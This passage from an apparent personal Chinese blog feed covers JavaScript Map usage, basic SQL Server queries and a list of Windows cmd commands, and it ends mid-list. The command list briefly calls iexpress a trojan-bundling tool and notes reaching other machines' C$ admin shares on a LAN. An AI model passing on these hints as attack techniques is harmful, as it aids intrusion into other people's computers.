class="string">'name'</span>,<span class="string">'张三'</span>],[<span class="string">'title'</span>,<span class="string">'Author'</span>]]);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">'name'</span>)); <span class="comment">//张三</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">'title'</span>)); <span class="comment">// Author</span></span><br><span class="line">   <span class="comment">//Set和Map都可以用来生成新的Map</span></span><br><span class="line">   <span class="keyword">const</span>  set = <span class="keyword">new</span> <span class="title class_">Set</span>([[<span class="string">'foo'</span>,<span class="number">1</span>],[<span class="string">'bar'</span>,<span class="number">2</span>]]);</span><br><span class="line">   <span class="keyword">const</span> m1 = <span class="keyword">new</span> <span class="title class_">Map</span>(set);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(m1.<span class="title function_">get</span>(<span class="string">'foo'</span>)); <span class="comment">// 1</span></span><br><span class="line">   <span class="keyword">const</span> m2 = <span class="keyword">new</span> <span class="title class_">Map</span>([[<span class="string">'baz'</span>,<span class="number">3</span>]]);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(m2.<span class="title function_">get</span>(<span class="string">'baz'</span>)); <span class="comment">// 3</span></span><br><span class="line">   <span class="comment">//如果对同一个键多次赋值</span></span><br><span class="line">   <span class="comment">//则覆盖</span></span><br><span class="line">   <span class="comment">//没有这个键则输出没有</span></span><br><span class="line">   <span class="comment">//这个键里面不完全则输出没有</span></span><br></pre></td></tr></tbody></table></figure><h5 id="37-Map对象的常用方法和属性"><a href="#37-Map对象的常用方法和属性" class="headerlink" title="37.Map对象的常用方法和属性"></a>37.Map对象的常用方法和属性</h5><p>Map是JavaScript中的一种数据结构，它允许你存储键值对，并且可以使用任何类型的值作为键。下面是Map的一些常用属性和方法的介绍：</p><p>属性：</p><ul><li><code>Map.prototype.size</code>：返回Map对象中的键值对数量。</li></ul><p>方法：</p><ul><li><code>Map.prototype.set(key, value)</code>：向Map对象中添加一个新的键值对。如果该键已经存在，则会更新对应的值。</li><li><code>Map.prototype.get(key)</code>：返回指定键所对应的值。如果键不存在，则返回undefined。</li><li><code>Map.prototype.has(key)</code>：判断Map对象中是否存在指定的键。如果存在，则返回true；否则返回false。</li><li><code>Map.prototype.delete(key)</code>：从Map对象中删除指定的键值对。</li><li><code>Map.prototype.clear()</code>：清空Map对象中的所有键值对。</li><li><code>Map.prototype.keys()</code>：返回一个新的迭代器对象，该对象按插入顺序包含Map对象中的所有键。</li><li><code>Map.prototype.values()</code>：返回一个新的迭代器对象，该对象按插入顺序包含Map对象中的所有值。</li><li><code>Map.prototype.entries()</code>：返回一个新的迭代器对象，该对象按插入顺序包含Map对象中的所有键值对。</li><li><code>Map.prototype.forEach(callbackFn[, thisArg])</code>：按插入顺序，为Map对象中的每个键值对执行一次提供的回调函数。</li></ul><p>使用示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">'name'</span>, <span class="string">'John'</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">'age'</span>, <span class="number">30</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="literal">true</span>, <span class="string">'yes'</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// 输出: 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">'name'</span>)); <span class="comment">// 输出: John</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">has</span>(<span class="string">'age'</span>)); <span class="comment">// 输出: true</span></span><br><span class="line">map.<span class="title function_">delete</span>(<span class="string">'age'</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">has</span>(<span class="string">'age'</span>)); <span class="comment">// 输出: false</span></span><br><span class="line">map.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value, key</span>) =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value);</span><br><span class="line">});</span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// name John</span></span><br><span class="line"><span class="comment">// true yes</span></span><br><span class="line">map.<span class="title function_">clear</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// 输出: 0</span></span><br></pre></td></tr></tbody></table></figure><p>这些是Map的一些常用属性和方法，它们可以帮助你在JavaScript中存储和操作键值对。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="comment">//  arr.遍历（值，键值）</span></span><br><span class="line">  arr.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value, index</span>) =&gt;</span> {</span><br><span class="line">      map.<span class="title function_">set</span>(index, value * <span class="number">2</span>);</span><br><span class="line">  });</span><br><span class="line">  <span class="keyword">let</span> arrv = <span class="title class_">Array</span>.<span class="title function_">from</span>(map.<span class="title function_">values</span>());</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arrv);</span><br></pre></td></tr></tbody></table></figure><p>注意:map改变的数组是一个有值和键值的数组，不能是单纯的数组,其结构[[‘value’,’index’],[‘value’,’index’],[‘value’,’index’]] 这样类似所以遍历的时候也必须要同时拥有这两个要素，否则无法遍历</p><h5 id="00-常用"><a href="#00-常用" class="headerlink" title="00.常用"></a>00.常用</h5><p>当谈到JavaScript中常用的代码时，有很多不同的方面可以涉及。以下是一些常见的JavaScript代码示例：</p><ol><li>变量声明和赋值：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">"John"</span>;</span><br><span class="line"><span class="keyword">const</span> age = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">var</span> isStudent = <span class="literal">true</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li>条件语句：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (age &gt;= <span class="number">18</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"成年人"</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"未成年人"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li>循环语句：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">numbers.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">number</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(number);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol><li>函数定义和调用：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">name</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, "</span> + name + <span class="string">"!"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">greet</span>(<span class="string">"Alice"</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li>对象和属性访问：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">"John"</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">  <span class="attr">isStudent</span>: <span class="literal">true</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li>数组操作：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numbers.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">numbers.<span class="title function_">push</span>(<span class="number">6</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numbers);</span><br><span class="line"></span><br><span class="line">numbers.<span class="title function_">pop</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numbers);</span><br></pre></td></tr></tbody></table></figure><ol><li>DOM操作：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"myElement"</span>);</span><br><span class="line">element.<span class="property">innerHTML</span> = <span class="string">"Hello, World!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">"button"</span>);</span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Button clicked!"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>这只是一小部分常见的JavaScript代码示例，JavaScript是一门非常灵活和功能强大的语言，可以用于各种不同的应用场景。具体的代码取决于你的需求和项目的要求。</p><p>后续根据情况会继续添加….</p>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlserver基础语句</title>
      <link href="/NANABLOG/2020/09/03/sqlserver/"/>
      <url>/NANABLOG/2020/09/03/sqlserver/</url>
      
        <content type="html"><![CDATA[<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Demo</span><br><span class="line"></span><br><span class="line"><span class="comment">--获取系统时间</span></span><br><span class="line"><span class="keyword">select</span> GETDATE()</span><br><span class="line"></span><br><span class="line"><span class="comment">--读取表里的生日</span></span><br><span class="line"><span class="keyword">select</span> birthady <span class="keyword">from</span> Demo</span><br><span class="line"></span><br><span class="line"><span class="comment">--计算年龄</span></span><br><span class="line"><span class="keyword">select</span> DATEDIFF(yy,<span class="string">'2003-06-01'</span>,GETDATE())</span><br><span class="line"></span><br><span class="line"><span class="comment">--读取表里的生日                      -- as 别名</span></span><br><span class="line"> <span class="keyword">select</span> DATEDIFF(yy,birthady,GETDATE()) <span class="keyword">as</span> <span class="string">'计算结果'</span> <span class="keyword">from</span> Demo;  <span class="comment">--如果没有from 表格 那么就无法定位到 名为 birthady的列 所以就会失败</span></span><br><span class="line"><span class="comment">-- 查询 [DATAEIFF() 函数返回两个日期的间隔 里面是 birthady日期 和 GETDATE 当前日期获取] 来自 Demo 表格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--全部查询</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student</span><br><span class="line"></span><br><span class="line"><span class="comment">--条件查询</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--起别名</span></span><br><span class="line">                 <span class="comment">--注意，as 可写可不写</span></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> <span class="string">'姓名'</span> ,age <span class="keyword">as</span> <span class="string">'年龄'</span>  <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--加top</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">2</span>  name <span class="keyword">as</span> <span class="string">'姓名'</span> ,age <span class="keyword">as</span> <span class="string">'年龄'</span>  <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--加常量列</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">2</span>  name <span class="keyword">as</span> <span class="string">'姓名'</span> ,age <span class="keyword">as</span> <span class="string">'年龄'</span> , <span class="string">'你好'</span> <span class="keyword">as</span> <span class="string">'还好'</span>  <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--加百分比查询 top</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">50</span> <span class="keyword">percent</span>  name <span class="keyword">as</span> <span class="string">'姓名'</span> ,age <span class="keyword">as</span> <span class="string">'年龄'</span> , <span class="string">'你好'</span> <span class="keyword">as</span> <span class="string">'还好'</span>  <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--加百分比查询 加减操作</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">50</span> <span class="keyword">percent</span>  name <span class="keyword">as</span> <span class="string">'姓名'</span> ,age <span class="operator">+</span> <span class="number">50</span> <span class="keyword">as</span> <span class="string">'年龄'</span> , <span class="string">'你好'</span> <span class="keyword">as</span> <span class="string">'还好'</span>  <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- is NULL 和 为空不一样</span></span><br><span class="line"><span class="comment">-- 查询条件为 值为NULL 或者 值为'空'</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> phone <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">or</span> phone <span class="operator">=</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 检索 所有 学生表 as 别名Stu</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Student <span class="keyword">as</span> Stu</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> score <span class="keyword">as</span> Sco <span class="comment">-- inner join 关联 成绩表 别名 as Sco</span></span><br><span class="line"><span class="keyword">on</span> Stu.Sid <span class="operator">=</span> Sco.id <span class="comment">-- 关联条件 学生表的 Sid 和 成绩表的 id 进行关联 查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--挑选结果</span></span><br><span class="line"><span class="keyword">select</span> Stu.name,Sco.name,Sco.age,Sco.sex,Sco.id <span class="keyword">from</span> Student <span class="keyword">as</span> Stu</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> score <span class="keyword">as</span> Sco</span><br><span class="line"><span class="keyword">on</span> Stu.Sid <span class="operator">=</span> Sco.id </span><br><span class="line"><span class="comment">--还可以写条件</span></span><br><span class="line"><span class="keyword">where</span> Sco.age<span class="operator">=</span><span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> score <span class="keyword">as</span> Sco <span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> Student <span class="keyword">as</span> Stu   <span class="comment">-- 左边查询 没有显示NULL</span></span><br><span class="line"><span class="keyword">on</span> Stu.Sid <span class="operator">=</span> Sco.id </span><br><span class="line"><span class="comment">--右链接 取反</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--求和</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">SUM</span>(age) <span class="keyword">as</span> <span class="string">'学生年龄和'</span> <span class="keyword">from</span> Student</span><br><span class="line"></span><br><span class="line"><span class="comment">--最大值 最小值</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">SUM</span>(age) <span class="keyword">as</span> <span class="string">'学生年龄和'</span> <span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(age) <span class="keyword">as</span> <span class="string">'学生平均值'</span> <span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(age) <span class="keyword">as</span> <span class="string">'男同学的最大年龄'</span> </span><br><span class="line"><span class="keyword">from</span> score <span class="keyword">where</span> sex <span class="operator">=</span> <span class="string">'男'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--个数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> <span class="string">'男同学个数'</span>  <span class="comment">-- 一般来说括号里是 * 或者是 1</span></span><br><span class="line"><span class="keyword">from</span> score <span class="keyword">where</span> sex <span class="operator">=</span> <span class="string">'男'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(age) <span class="keyword">as</span> <span class="string">'男同学的最大年龄'</span> </span><br><span class="line"><span class="keyword">from</span> score <span class="keyword">where</span> sex <span class="operator">=</span> <span class="string">'男'</span></span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> <span class="string">'女同学的个数'</span> </span><br><span class="line"><span class="keyword">from</span> score <span class="keyword">where</span> sex <span class="operator">=</span> <span class="string">'女'</span></span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span>(age) <span class="keyword">as</span> <span class="string">'男同学的年龄都有那些'</span> </span><br><span class="line"><span class="keyword">from</span> score <span class="keyword">where</span> sex <span class="operator">=</span> <span class="string">'男'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--聚合函数 分组</span></span><br><span class="line"><span class="keyword">select</span>  sex,<span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> <span class="string">'个数'</span> <span class="keyword">from</span> score <span class="comment">-- group by 为分组判断 他会把不一样的分组判断 计算个数出来 其中 group by 只负责分组 而 count负责计算</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sex</span><br><span class="line"></span><br><span class="line"><span class="comment">--where  是分组前的条件</span></span><br><span class="line"><span class="comment">--having 是分组后的条件</span></span><br><span class="line"><span class="keyword">select</span>  sex,<span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> <span class="string">'个数'</span> <span class="keyword">from</span> score</span><br><span class="line"><span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">1</span> <span class="comment">-- 为前</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sex</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&lt;</span> <span class="number">1</span> <span class="comment">-- 为后</span></span><br><span class="line"><span class="comment">--运行结果 满足此条件为 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Usersinfo</span><br><span class="line"><span class="keyword">where</span> LoginName <span class="keyword">in</span> (<span class="string">'lilei@163.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">--使用连接查询登录名为 lilei@163.com 的用户所记笔记的笔记标题 内容和用户姓名</span></span><br><span class="line"><span class="keyword">select</span> Note.Title,Note.Content,Usr.UserName <span class="keyword">from</span> Usersinfo <span class="keyword">as</span> Usr</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> NoteInfo <span class="keyword">as</span> Note</span><br><span class="line"><span class="keyword">on</span> Usr.UserId <span class="operator">=</span> Note.NoteId </span><br><span class="line"><span class="keyword">where</span> Usr.LoginName <span class="operator">=</span> <span class="string">'lilei@163.com'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--使用聚合函数查询登录名为 zhangtao@163.com 的用户且笔记分类名称是 工作 的笔记记录数</span></span><br><span class="line"><span class="comment">--聚合函数 分组</span></span><br><span class="line"><span class="keyword">select</span>  CategoryName,<span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> <span class="string">'个数'</span> <span class="keyword">from</span> NoteCategory <span class="comment">-- group by 为分组判断 他会把不一样的分组判断 计算个数出来 其中 group by 只负责分组 而 count负责计算</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> CategoryName</span><br><span class="line"></span><br><span class="line"><span class="comment">--使用模糊查询 查询登录名为 lilei.163.com 的用户 且笔记标题里包含 邮件 的笔记标题和内容</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Usersinfo</span><br><span class="line"><span class="keyword">where</span> LoginName <span class="keyword">like</span> <span class="string">'%lilei.163.com%'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--按照创建时间降序排序 查询登录名为 lilei@163.com 的前10条笔记的标题和内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--查询所有用户的姓名 登录名 笔记标题和笔记内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--查询记录笔记数大于 1 的用户姓名 登录名和性别</span></span><br><span class="line"></span><br><span class="line">use school</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"> <span class="comment">--添加语句</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student <span class="keyword">values</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"> <span class="comment">--添加语句</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student (name,sex,age)</span><br><span class="line"> <span class="keyword">values</span></span><br><span class="line"> (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"> <span class="comment">--运行结果失败，是因为不允许为NULL 不然则可以</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">--多行插入</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student <span class="keyword">values</span></span><br><span class="line"> (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>), <span class="comment">--如果报红要加一个逗号 </span></span><br><span class="line"> (<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> Patient (password,BirthDate,Gender,PatientName,PhoneNum,Email,IndentityNum,Address)</span><br><span class="line"> <span class="keyword">values</span>(<span class="number">123456</span>,<span class="string">'1985-06-07'</span>,<span class="string">'女'</span>,<span class="string">'夏颖'</span>,<span class="number">13800000001</span>,<span class="string">'ying.xia@qq.com'</span>,<span class="number">110000198506071100</span>,<span class="string">'厦门市'</span>),</span><br><span class="line"> (<span class="number">234567</span>,<span class="string">'1985-06-08'</span>,<span class="string">'男'</span>,<span class="string">'李政'</span>,<span class="number">1380000002</span>,<span class="string">'lizheng@163.com'</span>,<span class="number">210000198506082100</span>,<span class="string">'长春市'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Patient;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">--更新语句</span></span><br><span class="line"> <span class="keyword">UPDATE</span> Patient <span class="keyword">set</span> Password<span class="operator">=</span><span class="string">'11111'</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">--删除语句  范围是 id = 1;</span></span><br><span class="line"> <span class="keyword">delete</span> <span class="keyword">from</span> Patient <span class="keyword">where</span> Patient<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"> <span class="comment">--直接删除全部</span></span><br><span class="line"> <span class="keyword">delete</span> <span class="keyword">from</span> Patient </span><br><span class="line"> <span class="comment">--但是序号都在 </span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">--用清除会连序号全部彻底删除</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">--去重 加入 distinct后 sex展示相同的只会显示一次</span></span><br><span class="line"> <span class="keyword">select</span> <span class="keyword">distinct</span> sex <span class="keyword">from</span> Student</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dos操作指令</title>
      <link href="/NANABLOG/2019/10/18/Dos%E6%95%B4%E7%90%86/"/>
      <url>/NANABLOG/2019/10/18/Dos%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="DOS整理"><a href="#DOS整理" class="headerlink" title="DOS整理"></a>DOS整理</h4><p><strong>文件路径</strong></p><hr><p><strong>[桌面目录cmd.exe]</strong> c:\windows\system32\cmd</p><p><strong>[xp桌面目录]</strong> c:\documents and settings\all users\桌面</p><p>[win7桌面目录] c:\users\administrator[name]\desktop\</p><p><strong>cmd程序</strong></p><hr><p>winver - 检查windows版本</p><p>wscript - windows脚本宿主设置</p><p>write - 写字板</p><p>wiaacmgr - 扫描仪和照相机向导</p><p>winchat - xp自在局域网聊天</p><p>msconfig.exe - 系统配置实用程序</p><p>mspaint - 画图板</p><p>mstsc - 远程桌面连接</p><p>magnify - 放大镜程序</p><p>mmc - 打开控制台</p><p>mobsync - 同步命令</p><p>dxdiag - 检查DirectX信息</p><p>diskmgmt.msc - 磁盘管理实用程序</p><p>dcomcnfg - 系统组件服务</p><p>dvdplay - DVD播放器</p><p>notepad - 打开记事本</p><p>narrator - 屏幕讲述人</p><p>netstat -an – (TC命令检查接口</p><p>sigverif - 文件签名验证系统</p><p>shrpubw - 创建共享文件夹</p><p>syskey - 系统加密双重加密</p><p>services.msc - 本地服务设置</p><p>sfc.exe - 系统文件检查器</p><p>taskmgr - 任务管理器</p><p>eventvwr - 事件查看器</p><p>eudcedit - 造字程序</p><p>explorer - 打开资源管理器</p><p>perfmon.msc - 计算机性能监测程序</p><p>regedit.exe - 注册表</p><p>rsop.msc - 注册表结果集</p><p>chkdsk.exe - 磁盘检查</p><p>certmgr.msc - 证书管理实用程序</p><p>calc - 启动计算机</p><p>charmap - 启动字符映射表</p><p>compmgmt.msc - 计算机管理</p><p>cleanmgr - 垃圾清理</p><p>osk - 打开屏幕键盘</p><p>lusrmgr.msc - 本机用户和组</p><p>iexpress - mu马捆绑系统自带CAB压缩和自解压工具</p><p>fsmgmt.msc - 共享文件夹管理器</p><p>utilman - 辅助工具管理器</p><p><strong>备忘录</strong></p><hr><p><strong>一般管理员服务器账号****：</strong>administrator</p><p><strong>快捷键</strong></p><hr><p>[打开输入法] ctrl+空格</p><p><strong>运行</strong></p><hr><p>explorer.exe [桌面程序]</p><p>mstsc [远程桌面程序]</p><p>\[ip] [访问共享文件夹，多数适用于局域网内的文件运输]</p><p>\ [ip]*<em>c$</em>* [默认情况处在同一网络中可以访问c盘]</p><p>logoff [注销]</p><p>regedit [修改注册表]</p><p>services.msc [服务管理窗口]</p><p><strong>基础目录控制 [按tab可以补全]</strong></p><hr><p>dir [浏览文件] /a=浏览包括隐藏的文件和文件夹</p><p>cls [清屏]</p><p>ren [重命名]</p><p>rd [删除]</p><p>cd [进入]</p><p>md [创建文件夹]</p><p>move [移动]</p><p>copy [复制]</p><p>xcopy [复制文件夹及文件夹里的文件]</p><p>more [显示内容] more 1.txt 2.txt 分页显示多个文档</p><p>type [打印]</p><p>del [删除文件]</p><p>echo nul&gt; 路径 [创建一个自义定内容和路径的文件]</p><p>echo. [回响空行]</p><p>attrib <strong>+s +h</strong> [更改属性 s=系统 h=隐藏]</p><p>tree [扫描文件]</p><p>exit [退出窗口]</p><p><strong>命令</strong></p><hr><p>arp -a [查看局域网其他人的IP]</p><p>shutdown <strong>-s -f -t</strong> time[关机 s=关机 f=强制 t=时间 time=自义定]</p><p>pause [暂停]</p><p>color [改变背景和文字颜色]</p><p>fsutil file createnew [创建文件，并自定义文件占内存大小]</p><p>taskkill <strong>/f /im</strong> [强制杀死电脑进程]  </p><p>tasklist [列出进程/管理进程]</p><p>nslookup [ip] [检查ip地址的ns服务器]</p><p>at [time] [添加计划任务] #如果使用at来打开其他bat有两种方法1: at [time] c:\1.bat 2: at [time] “start c:\1.bat” 加引号是为了把start当做是参数，不过我推荐直接输入路径就好</p><p>at [查看计划任务]</p><p>telnet 